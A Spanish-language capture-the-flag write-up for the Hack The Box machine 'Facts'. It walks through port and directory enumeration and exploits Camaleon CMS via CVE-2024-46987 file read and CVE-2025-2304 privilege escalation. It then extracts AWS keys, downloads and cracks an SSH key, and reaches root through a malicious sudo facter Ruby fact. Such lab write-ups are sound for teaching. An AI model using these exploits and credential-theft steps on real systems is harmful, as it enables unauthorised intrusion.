# Hack The Box: Facts - Writeup

## 1. Reconocimiento Inicial

Iniciamos con un escaneo de puertos utilizando Nmap para identificar los servicios expuestos en la máquina objetivo.

```bash
❯ nmap -sC -sV 10.129.27.92 -oX nmap

Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-04-09 19:14 -0600
Nmap scan report for facts.htb (10.129.27.92)
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: facts
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Agregamos el dominio al archivo `/etc/hosts` local para correcta resolución:
```bash
❯ sudo nano /etc/hosts
# Se añade: 10.129.27.92  facts.htb
```

## 2. Fuzzing y Enumeración Web

Al ser un servidor web estándar, realizamos un proceso de fuzzing de directorios utilizando `ffuf` y un diccionario estándar de DirBuster.

```bash
❯ ffuf -u [http://facts.htb/FUZZ](http://facts.htb/FUZZ) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php,.txt,.html
```

El escaneo reveló múltiples endpoints válidos con código `200` y un redireccionamiento `302` hacia el directorio `/admin`. Al acceder a esta ruta a través del navegador, identificamos un panel de autenticación perteneciente a **Camaleon CMS**.

## 3. Acceso Inicial y Enumeración de Usuarios (CVE-2024-46987)

El panel de administración permitía el registro de nuevos usuarios. Tras registrarnos con credenciales de prueba (`alex:alex`), confirmamos la versión del CMS: Camaleon v2.9.0.

Esta versión es vulnerable a un ataque de Path Traversal (Arbitrary File Read) autenticado. Utilizamos un script público para extraer el archivo `/etc/passwd` y confirmar los usuarios del sistema.

```bash
❯ python3 CVE-2024-46987.py -u [http://facts.htb](http://facts.htb) -l alex -p alex /etc/passwd

root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Con la confirmación del directorio `/home/william`, procedimos a extraer la primera bandera (User Flag):

```bash
❯ python3 CVE-2024-46987.py -u [http://facts.htb](http://facts.htb) -l alex -p alex -v /home/william/user.txt
4214073ef38f05e7d7497f75c56a405a
```

## 4. Escalamiento de Privilegios Web (CVE-2025-2304)

Buscando mayor control sobre el CMS, explotamos una vulnerabilidad de Mass Assignment para escalar los privilegios de nuestro usuario de prueba de 'Client' a 'Administrator'.

```bash
❯ python3 cve-2025-2304.py [http://facts.htb](http://facts.htb) -u alex -p alex

[*] Logging in as alex...
[+] Successfully logged in
[*] Detected version: 2.9.0
[+] Version is VULNERABLE (< 2.9.1)
...
[+] EXPLOITATION SUCCESSFUL!
[+] Privilege Escalation: Client → Administrator
```

## 5. Exfiltración de Credenciales AWS S3

Como administradores del CMS, inspeccionamos las configuraciones internas. En el apartado de `Settings -> General Site -> Filesystem Settings`, identificamos llaves de acceso estáticas para un bucket de Amazon S3 (`AWS Access Key` y `AWS Secret Key`).

Configuramos un perfil local en la AWS CLI con las credenciales obtenidas:

```bash
❯ aws configure --profile facts
AWS Access Key ID: AKIAC6FE1060E0FA58AF
AWS Secret Access Key: 0IS7HbuSjOGS9Zl3jTzPwKXqeqo4yXRWpOz/2EF3
```

Al listar el contenido del endpoint interno proporcionado por la infraestructura (puerto 54321), descubrimos el contenido del directorio local de un usuario, incluyendo su llave SSH privada.

```bash
❯ aws --profile facts --endpoint-url [http://facts.htb:54321](http://facts.htb:54321) s3 ls s3://internal/
                           PRE .ssh/
                           
❯ aws --profile facts --endpoint-url [http://facts.htb:54321](http://facts.htb:54321) s3 cp s3://internal/.ssh/id_ed25519 .
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519
```

## 6. SSH Cracking y Acceso al Sistema

La llave `id_ed25519` descargada estaba encriptada con un *passphrase*. Extraímos el hash correspondiente y utilizamos John the Ripper junto con el diccionario `rockyou.txt` para romper la contraseña.

```bash
❯ python3 /usr/share/john/ssh2john.py id_ed25519 > key.hash
❯ john key.hash --wordlist=/usr/share/wordlists/rockyou.txt

Loaded 1 password hash (SSH, SSH private key)
dragonballz      (id_ed25519)
```

Tras ajustar los permisos de la llave (`chmod 600`), establecimos conexión SSH con el usuario secundario identificado en la máquina.

```bash
❯ ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519': [dragonballz]
```

## 7. Escalamiento de Privilegios a Root

Dentro de la sesión de `trivia`, evaluamos los permisos de superusuario mediante `sudo -l`.

```bash
trivia@facts:~$ sudo -l
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

La herramienta `facter` (utilizada para recolectar información del sistema) permite ejecutar scripts Ruby personalizados. Aunque las variables de entorno como `FACTERLIB` estaban bloqueadas por la configuración de sudo, la ejecución nativa con la bandera `--custom-dir` no lo estaba.

Creamos un script de Ruby malicioso en `/tmp` para generar una terminal de bash y lo ejecutamos bajo el contexto de sudo.

```bash
trivia@facts:~$ echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb
trivia@facts:~$ sudo /usr/bin/facter pwn --custom-dir /tmp

root@facts:/# whoami
root
root@facts:~# cat /root/root.txt
ecba2be4c86af82998b89c188ac74685
```

**Máquina Facts comprometida en su totalidad.**
```